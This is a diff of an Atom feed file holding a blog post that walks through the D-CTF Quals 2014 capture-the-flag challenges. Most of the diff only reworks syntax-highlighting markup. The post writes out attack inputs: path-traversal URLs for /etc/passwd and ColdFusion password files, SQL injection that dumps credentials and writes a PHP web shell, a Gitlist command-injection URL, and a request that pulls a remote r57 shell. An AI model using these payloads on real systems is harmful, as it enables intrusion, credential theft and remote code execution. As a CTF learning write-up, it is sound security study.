@@ -1,7 +1,5 @@
 <?xml version="1.0" encoding="utf-8"?>
-<feed xmlns="http://www.w3.org/2005/Atom"><title>chmod +x singularity.sh - ExifTool</title><link href="http://bt3gl.github.io/" rel="alternate"></link><link href="http://bt3gl.github.io/feeds/exiftool.atom.xml" rel="self"></link><id>http://bt3gl.github.io/</id><updated>2014-10-22T06:30:00-04:00</updated><entry><title>Exploring D-CTF Quals 2014's Exploits</title><link href="http://bt3gl.github.io/exploring-d-ctf-quals-2014s-exploits.html" rel="alternate"></link><published>2014-10-22T06:30:00-04:00</published><updated>2014-10-22T06:30:00-04:00</updated><author><name>Marina von Steinkirch</name></author><id>tag:bt3gl.github.io,2014-10-22:/exploring-d-ctf-quals-2014s-exploits.html</id><summary type="html">&lt;p&gt;Last weekend I played some of the &lt;a href="http://dctf.defcamp.ro/challs"&gt;DEFCAMP CTF Quals&lt;/a&gt;. It was pretty intense. For (my own)  organizational purposes, I made a list of all the technologies and vulnerabilities  found in this CTF, some based on my team's game, some based on the &lt;a href="https://github.com/ctfs/write-ups/tree/master/d-ctf-2014/"&gt;CTF write-ups git repo&lt;/a&gt;.&lt;/p&gt;
-&lt;h2&gt;Vulnerabilities&lt;/h2&gt;
-&lt;h3&gt;Remote File …&lt;/h3&gt;</summary><content type="html">&lt;p&gt;Last weekend I played some of the &lt;a href="http://dctf.defcamp.ro/challs"&gt;DEFCAMP CTF Quals&lt;/a&gt;. It was pretty intense. For (my own)  organizational purposes, I made a list of all the technologies and vulnerabilities  found in this CTF, some based on my team's game, some based on the &lt;a href="https://github.com/ctfs/write-ups/tree/master/d-ctf-2014/"&gt;CTF write-ups git repo&lt;/a&gt;.&lt;/p&gt;
+<feed xmlns="http://www.w3.org/2005/Atom"><title>chmod +x singularity.sh</title><link href="http://bt3gl.github.io/" rel="alternate"></link><link href="http://bt3gl.github.io/feeds/exiftool.atom.xml" rel="self"></link><id>http://bt3gl.github.io/</id><updated>2014-10-22T06:30:00-04:00</updated><entry><title>Exploring D-CTF Quals 2014's Exploits</title><link href="http://bt3gl.github.io/exploring-d-ctf-quals-2014s-exploits.html" rel="alternate"></link><updated>2014-10-22T06:30:00-04:00</updated><author><name>Mia von Steinkirch</name></author><id>tag:bt3gl.github.io,2014-10-22:exploring-d-ctf-quals-2014s-exploits.html</id><summary type="html">&lt;p&gt;Last weekend I played some of the &lt;a href="http://dctf.defcamp.ro/challs"&gt;DEFCAMP CTF Quals&lt;/a&gt;. It was pretty intense. For (my own)  organizational purposes, I made a list of all the technologies and vulnerabilities  found in this CTF, some based on my team's game, some based on the &lt;a href="https://github.com/ctfs/write-ups/tree/master/d-ctf-2014/"&gt;CTF write-ups git repo&lt;/a&gt;.&lt;/p&gt;
 &lt;h2&gt;Vulnerabilities&lt;/h2&gt;
 &lt;h3&gt;Remote File Inclusion and Local File Inclusion Vulnerabilities&lt;/h3&gt;
 &lt;p&gt;In &lt;a href="http://projects.webappsec.org/w/page/13246955/Remote%20File%20Inclusion"&gt;Remote File Inclusion&lt;/a&gt; (RFI) an attacker can load exploits to the server. An attacker can use RFI to run exploits in both server and client sides. PHP's &lt;a href="http://php.net/manual/en/function.include.php"&gt;include()&lt;/a&gt; is extremely vulnerable to RFI attacks.&lt;/p&gt;
@@ -13,7 +11,7 @@
 &lt;h3&gt;CMS Mini and RFI&lt;/h3&gt;
 &lt;p&gt;&lt;a href="http://www.mini-print.com/"&gt;CMS Mini&lt;/a&gt; is file system to build simple websites. It has &lt;a href="http://www.exploit-db.com/exploits/33030/"&gt;several vulnerabilities&lt;/a&gt; such as &lt;a href="https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)"&gt;CSRF&lt;/a&gt;, RFI, and &lt;a href="https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)"&gt;XSS&lt;/a&gt;.&lt;/p&gt;
 &lt;p&gt;An example of RFI vulnerability in CMS Mini is explored using curl:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="err"&gt;http://&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="err"&gt;http://&lt;/span&gt;
 &lt;span class="err"&gt;[target/IP]/cmsmini/admin/edit.php?path=&amp;amp;name=../../../../../etc/passwd&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
@@ -22,13 +20,13 @@
 &lt;h3&gt;ApPHP and Remote Code Execution&lt;/h3&gt;
 &lt;p&gt;&lt;a href="http://www.apphp.com/"&gt;ApPHP&lt;/a&gt; is a blog script. It is known for having  &lt;a href="http://www.exploit-db.com/exploits/33030/"&gt;several vulnerabilities&lt;/a&gt;, including &lt;a href="https://www.owasp.org/index.php/PHP_Top_5#P1:_Remote_Code_Execution"&gt;remote code execution&lt;/a&gt; (RCE). An example of RCE exploit for ApPHP &lt;a href="http://www.exploit-db.com/exploits/33070/"&gt;can be seen here&lt;/a&gt;. A good start is to check the PHP's &lt;a href="http://php.net/manual/en/ini.core.php#ini.disable-functions"&gt;disable_function&lt;/a&gt; list for stuff to hacker the server.&lt;/p&gt;
 &lt;p&gt;In this CTF, the challenge was to find what was not in that list. For instance, it was possible to use &lt;a href="http://php.net/manual/en/reserved.variables.post.php"&gt;$_POST&lt;/a&gt; and &lt;a href="http://php.net/manual/en/reserved.variables.cookies.php"&gt;$_COOKIE&lt;/a&gt; to send strings to functions such as &lt;a href="http://php.net/manual/en/function.scandir.php"&gt;scandir()&lt;/a&gt; and &lt;a href="http://php.net/manual/en/function.file-get-contents.php"&gt;get_file_contents()&lt;/a&gt;:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="err"&gt;GET Request: ?asdf);print_r(scandir(implode($_COOKIE))=/&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="err"&gt;GET Request: ?asdf);print_r(scandir(implode($_COOKIE))=/&lt;/span&gt;
 &lt;span class="err"&gt;Cookie: 0=include&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;In addition, with a writable directory we can drop a shell in the server (you can use script-kiddies scripts like &lt;a href="http://www.r57shell.net/"&gt;r57 shell.net&lt;/a&gt;, but in real life, keep in mind that they are super uber &lt;a href="http://thehackerblog.com/hacking-script-kiddies-r57-gen-tr-shells-are-backdoored-in-a-way-you-probably-wouldnt-guess/#more-447"&gt;backdoored&lt;/a&gt;).&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="err"&gt;Post Request: 0=include/myfile.php&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="err"&gt;Post Request: 0=include/myfile.php&lt;/span&gt;
 &lt;span class="err"&gt;Cookie: 0=http://www.r57shell.net/shell/r57.txt&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
@@ -36,7 +34,7 @@
 &lt;h3&gt;Gitlist and Remote Command Execution&lt;/h3&gt;
 &lt;p&gt;&lt;a href="http://gitlist.org/"&gt;Gitlist&lt;/a&gt; is an application to browse github repositories in a browser. The  versions up to 5.0 are known for &lt;a href="http://www.websecuritywatch.com/arbitrary-command-execution-in-gitlist/"&gt;allowing remote attackers to execute arbitrary commands via shell&lt;/a&gt;, a type of &lt;a href="http://cwe.mitre.org/data/definitions/77.html"&gt;command injection&lt;/a&gt;. Exploits for this vulnerability can be seen at &lt;a href="http://hatriot.github.io/blog/2014/06/29/gitlist-rce/"&gt;hatriot&lt;/a&gt;, at &lt;a href="http://packetstormsecurity.com/files/127364/Gitlist-Unauthenticated-Remote-Command-Execution.html"&gt;packet storm&lt;/a&gt;, at &lt;a href="http://en.1337day.com/exploit/22391"&gt;1337day&lt;/a&gt;, and at &lt;a href="http://www.exploit-db.com/exploits/33990/"&gt;exploit-db&lt;/a&gt;.&lt;/p&gt;
 &lt;p&gt;In this CTF, the following command could be used to look for the flag:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="err"&gt;http://10.13.37.33/gitlist/redis/blame/unstable/README%22%22%60ls%20-al%60&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="err"&gt;http://10.13.37.33/gitlist/redis/blame/unstable/README%22%22%60ls%20-al%60&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
@@ -44,12 +42,12 @@
 &lt;p&gt;LibreOffice's has a binary &lt;a href="http://www.processlibrary.com/en/directory/files/soffice/66728/"&gt;soffice.bin&lt;/a&gt; that takes socket connections on the &lt;em&gt;port 2002&lt;/em&gt; (in this CTF, in the VPN's localhost).&lt;/p&gt;
 &lt;p&gt;For instance, the  command &lt;a href="http://linux.die.net/man/1/unoconv"&gt;unoconv&lt;/a&gt; can be used  to convert a file to a LibreOffice supported format. The flag &lt;strong&gt;-c&lt;/strong&gt; opens a connection by the client to connect to an LibreOffice instance. It also can be used by the listener to make LibreOffice listen.&lt;/p&gt;
 &lt;p&gt;From the documentation, the default connection string is:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="err"&gt;Default connection string is &amp;quot;socket,host=localhost,port=2002;urp;StarOffice.ComponentContext&amp;quot;&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="err"&gt;Default connection string is &amp;quot;socket,host=localhost,port=2002;urp;StarOffice.ComponentContext&amp;quot;&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;Therefore, you can connect to the socket and convert some document (such as &lt;em&gt;/flag.txt&lt;/em&gt;) to a PDF for example:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ unoconv --connection &lt;span class="s1"&gt;&amp;#39;socket,host=127.0.0.1,port=2002;urp;StarOffice.ComponentContext&amp;#39;&lt;/span&gt; -f pdf /flag.txt
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;unoconv --connection &lt;span class="s1"&gt;&amp;#39;socket,host=127.0.0.1,port=2002;urp;StarOffice.ComponentContext&amp;#39;&lt;/span&gt; -f pdf /flag.txt
 &lt;/pre&gt;&lt;/div&gt;
 
 
@@ -64,21 +62,21 @@
 &lt;ul&gt;
 &lt;li&gt;List everything  in a database, where &lt;strong&gt;0x3a&lt;/strong&gt; is the hexadecimal symbol for &lt;strong&gt;:&lt;/strong&gt;:&lt;/li&gt;
 &lt;/ul&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;UNION&lt;/span&gt; &lt;span class="k"&gt;ALL&lt;/span&gt; &lt;span class="k"&gt;SELECT&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;concat&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;username&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="n"&gt;x3a&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;password&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="n"&gt;x3a&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;email&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;&lt;span class="mi"&gt;3&lt;/span&gt; &lt;span class="k"&gt;FROM&lt;/span&gt; &lt;span class="n"&gt;cms&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;users&lt;/span&gt;&lt;span class="c1"&gt;--&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="k"&gt;UNION&lt;/span&gt; &lt;span class="k"&gt;ALL&lt;/span&gt; &lt;span class="k"&gt;SELECT&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;concat&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;username&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="n"&gt;x3a&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;password&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="n"&gt;x3a&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;email&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;&lt;span class="mi"&gt;3&lt;/span&gt; &lt;span class="k"&gt;FROM&lt;/span&gt; &lt;span class="n"&gt;cms&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;users&lt;/span&gt;&lt;span class="c1"&gt;--&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;ul&gt;
 &lt;li&gt;See the password file content:&lt;/li&gt;
 &lt;/ul&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;UNION&lt;/span&gt; &lt;span class="k"&gt;ALL&lt;/span&gt; &lt;span class="k"&gt;SELECT&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;LOAD_FILE&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="ss"&gt;&amp;quot;/etc/passwd&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;&lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="c1"&gt;--&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="k"&gt;UNION&lt;/span&gt; &lt;span class="k"&gt;ALL&lt;/span&gt; &lt;span class="k"&gt;SELECT&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;LOAD_FILE&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="ss"&gt;&amp;quot;/etc/passwd&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;&lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="c1"&gt;--&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;ul&gt;
 &lt;li&gt;Write files and create a PHP shell into &lt;strong&gt;URL/shell.php&lt;/strong&gt;, we can use a parameter &lt;strong&gt;x&lt;/strong&gt; to takes a parameter to be executed (based on &lt;a href="https://github.com/ctfs/write-ups/tree/master/d-ctf-2014/web-400"&gt;this&lt;/a&gt;):&lt;/li&gt;
 &lt;/ul&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nx"&gt;UNION&lt;/span&gt; &lt;span class="nx"&gt;ALL&lt;/span&gt; &lt;span class="nx"&gt;SELECT&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="cp"&gt;&amp;lt;?php&lt;/span&gt; &lt;span class="nb"&gt;header&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Content-Type: text/plain;charset=utf-8&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt; &lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="nb"&gt;system&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="err"&gt;$&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="nx"&gt;GET&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;x&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;]);&lt;/span&gt; &lt;span class="cp"&gt;?&amp;gt;&lt;/span&gt;&lt;span class="s2"&gt;&amp;#39;,3 INTO OUTFILE &amp;#39;/var/www/html/shell.php&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;--&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nt"&gt;UNION&lt;/span&gt; &lt;span class="nt"&gt;ALL&lt;/span&gt; &lt;span class="nt"&gt;SELECT&lt;/span&gt; &lt;span class="nt"&gt;1&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&amp;lt;?php header(&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;Content-Type&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="nt"&gt;text&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="nt"&gt;plain&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;&lt;span class="nt"&gt;charset&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="nt"&gt;utf-8&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;); echo system($-GET&lt;/span&gt;&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;x&amp;quot;&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;&lt;span class="s2"&gt;); ?&amp;gt;&amp;#39;,3 INTO OUTFILE &amp;#39;/var/www/html/shell.php&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;--&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
@@ -98,20 +96,20 @@
 &lt;p&gt;At the ColdFusion administrator, verify the version, and then use these injections:&lt;/p&gt;
 &lt;/li&gt;
 &lt;/ul&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;(Version 6): http://site/CFIDE/administrator/enter.cfm?locale=..\..\..\..\..\..\..\..\CFusionMX\lib\password.properties%00en
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;Version&lt;/span&gt; &lt;span class="mi"&gt;6&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="n"&gt;http&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="c1"&gt;//site/CFIDE/administrator/enter.cfm?locale=..\..\..\..\..\..\..\..\CFusionMX\lib\password.properties%00en&lt;/span&gt;
 
-(Version 7): http://site/CFIDE/administrator/enter.cfm?locale=..\..\..\..\..\..\..\..\CFusionMX7\lib\password.properties%00en
+&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;Version&lt;/span&gt; &lt;span class="mi"&gt;7&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="n"&gt;http&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="c1"&gt;//site/CFIDE/administrator/enter.cfm?locale=..\..\..\..\..\..\..\..\CFusionMX7\lib\password.properties%00en&lt;/span&gt;
 
-(Version 8): http://site/CFIDE/administrator/enter.cfm?locale=..\..\..\..\..\..\..\..\ColdFusion8\lib\password.properties%00en
+&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;Version&lt;/span&gt; &lt;span class="mi"&gt;8&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="n"&gt;http&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="c1"&gt;//site/CFIDE/administrator/enter.cfm?locale=..\..\..\..\..\..\..\..\ColdFusion8\lib\password.properties%00en&lt;/span&gt;
 
-(All versions): http://site/CFIDE/administrator/enter.cfm?locale=..\..\..\..\..\..\..\..\..\..\JRun4\servers\cfusion\cfusion-ear\cfusion-war\WEB-INF\cfusion\lib\password.properties%00en
+&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;All&lt;/span&gt; &lt;span class="n"&gt;versions&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="n"&gt;http&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="c1"&gt;//site/CFIDE/administrator/enter.cfm?locale=..\..\..\..\..\..\..\..\..\..\JRun4\servers\cfusion\cfusion-ear\cfusion-war\WEB-INF\cfusion\lib\password.properties%00en&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;ul&gt;
 &lt;li&gt;Now a shell can be written to a file and added in &lt;strong&gt;Schedule New Task&lt;/strong&gt;. See detailed instructions at &lt;a href="http://www.blackhatlibrary.net/Coldfusion_hacking"&gt;blackhatlib&lt;/a&gt;, at &lt;a href="http://www.infointox.net/?p=59"&gt;infointox&lt;/a&gt;, at &lt;a href="http://www.gnucitizen.org/blog/coldfusion-directory-traversal-faq-cve-2010-2861/"&gt;gnucitizen&lt;/a&gt;, at &lt;a href="http://kaoticcreations.blogspot.com/2012/11/hacking-cold-fusion-servers-part-i.html"&gt;kaoticcreations&lt;/a&gt;, at &lt;a href="https://www.cyberguerrilla.org/blog/?p=18275"&gt;cyberguerilla&lt;/a&gt;, at &lt;a href="http://jumpespjump.blogspot.com/2014/03/attacking-adobe-coldfusion.html"&gt;jumpespjump&lt;/a&gt;, and at &lt;a href="http://hexale.blogspot.com/2008/07/how-to-decrypt-coldfusion-datasource.html"&gt;hexale&lt;/a&gt;.&lt;/li&gt;
 &lt;/ul&gt;
-&lt;hr&gt;
+&lt;hr /&gt;
 &lt;h2&gt;Useful Tools&lt;/h2&gt;
 &lt;h3&gt;Vulnerability Scanners&lt;/h3&gt;
 &lt;p&gt;Vulnerability scanners can be useful for several problems. For instance, for a PHP static source code analyser, we can use &lt;a href="http://rips-scanner.sourceforge.net/"&gt;RIPS&lt;/a&gt;.&lt;/p&gt;
@@ -121,7 +119,7 @@
 &lt;h3&gt;Steganography&lt;/h3&gt;
 &lt;p&gt;One of the questions had a reference to the &lt;a href="https://ccrma.stanford.edu/~eberdahl/Projects/Paranoia/"&gt;paranoia.jar&lt;/a&gt; tool, which hides text in an image file using &lt;a href="http://en.wikipedia.org/wiki/Advanced_Encryption_Standard"&gt;128 bit AES&lt;/a&gt; encryption.&lt;/p&gt;
 &lt;p&gt;To run the tool (after downloading it) just do:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;java -jar paranoia.jar
+&lt;div class="highlight"&gt;&lt;pre&gt;java -jar paranoia.jar
 &lt;/pre&gt;&lt;/div&gt;
 
 
@@ -136,25 +134,25 @@
 &lt;ul&gt;
 &lt;li&gt;Look for POST requests:&lt;/li&gt;
 &lt;/ul&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;http.request.method == &amp;quot;POST&amp;quot;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;http&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;method&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;POST&amp;quot;&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;ul&gt;
 &lt;li&gt;Submit the found data (same username, nonce, and password) with the command:&lt;/li&gt;
 &lt;/ul&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ curl --data &lt;span class="s1"&gt;&amp;#39;user=manager&amp;amp;nonce=7413734ab666ce02cf27c9862c96a8e7&amp;amp;pass=3ecd6317a873b18e7dde351ac094ee3b&amp;#39;&lt;/span&gt; HOST
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="err"&gt;$&lt;/span&gt; &lt;span class="n"&gt;curl&lt;/span&gt; &lt;span class="o"&gt;--&lt;/span&gt;&lt;span class="n"&gt;data&lt;/span&gt; &lt;span class="err"&gt;&amp;#39;&lt;/span&gt;&lt;span class="n"&gt;user&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;manager&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;nonce&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;7413734&lt;/span&gt;&lt;span class="n"&gt;ab666ce02cf27c9862c96a8e7&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;pass&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="n"&gt;ecd6317a873b18e7dde351ac094ee3b&lt;/span&gt;&lt;span class="err"&gt;&amp;#39;&lt;/span&gt; &lt;span class="n"&gt;HOST&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;h3&gt;&lt;a href="http://en.wikipedia.org/wiki/Exchangeable_image_file_format"&gt;Exif&lt;/a&gt; data extractor:&lt;/h3&gt;
 &lt;p&gt;&lt;a href="http://www.sno.phy.queensu.ca/~phil/exiftool/index.html"&gt;ExifTool&lt;/a&gt;  is used for reading, writing, and manipulating image metadata:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ tar -xf Image-ExifTool-9.74.tar.gz
-$  &lt;span class="nb"&gt;cd&lt;/span&gt; Image-ExifTool-9.74/
-$ perl Makefile.PL
-$ make &lt;span class="nb"&gt;test&lt;/span&gt;
-$ sudo make install
-$ exiftool IMAGEFILE
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;tar -xf Image-ExifTool-9.74.tar.gz
+&lt;span class="nv"&gt;$ &lt;/span&gt; &lt;span class="nb"&gt;cd &lt;/span&gt;Image-ExifTool-9.74/
+&lt;span class="nv"&gt;$ &lt;/span&gt;perl Makefile.PL
+&lt;span class="nv"&gt;$ &lt;/span&gt;make &lt;span class="nb"&gt;test&lt;/span&gt;
+&lt;span class="nv"&gt;$ &lt;/span&gt;sudo make install
+&lt;span class="nv"&gt;$ &lt;/span&gt;exiftool IMAGEFILE
 &lt;/pre&gt;&lt;/div&gt;
 
 
@@ -164,14 +162,14 @@ $ exiftool IMAGEFILE
 &lt;ul&gt;
 &lt;li&gt;&lt;strong&gt;Hexadecimal decoders&lt;/strong&gt; are essential. You can use Python's &lt;a href="https://docs.python.org/2/library/functions.html#hex"&gt;hex&lt;/a&gt;:&lt;/li&gt;
 &lt;/ul&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ python -c &lt;span class="s1"&gt;&amp;#39;print &amp;quot;2f722f6e6574736563&amp;quot;.decode(&amp;quot;hex&amp;quot;)&amp;#39;&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;python -c &lt;span class="s1"&gt;&amp;#39;print &amp;quot;2f722f6e6574736563&amp;quot;.decode(&amp;quot;hex&amp;quot;)&amp;#39;&lt;/span&gt;
 /r/netsec
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;or command line &lt;a href="http://linuxcommand.org/man_pages/xxd1.html"&gt;xxd&lt;/a&gt;:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ yum install vim-common
-$ xxd -r -p &lt;span class="o"&gt;&amp;lt;&amp;lt;&amp;lt;&lt;/span&gt; 2f722f6e6574736563
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;yum install vim-common
+&lt;span class="nv"&gt;$ &lt;/span&gt;xxd -r -p &lt;span class="o"&gt;&amp;lt;&amp;lt;&amp;lt;&lt;/span&gt; 2f722f6e6574736563
 /r/netsec
 &lt;/pre&gt;&lt;/div&gt;
 
@@ -179,22 +177,22 @@ $ xxd -r -p &lt;span class="o"&gt;&amp;lt;&amp;lt;&amp;lt;&lt;/span&gt; 2f722f6e
 &lt;ul&gt;
 &lt;li&gt;&lt;strong&gt;Base64 decoders&lt;/strong&gt; are also essential:&lt;/li&gt;
 &lt;/ul&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ base64 --decode &lt;span class="o"&gt;&amp;lt;&amp;lt;&amp;lt;&lt;/span&gt; BASE64STRING &amp;gt; OUTPUT
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;base64 --decode &lt;span class="o"&gt;&amp;lt;&amp;lt;&amp;lt;&lt;/span&gt; BASE64STRING &amp;gt; OUTPUT
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;ul&gt;
 &lt;li&gt;&lt;strong&gt;nmap&lt;/strong&gt;, obviously. You can use it in Python scripts, using the &lt;a href="https://docs.python.org/2/library/subprocess.html"&gt;subprocess&lt;/a&gt; library:&lt;/li&gt;
 &lt;/ul&gt;
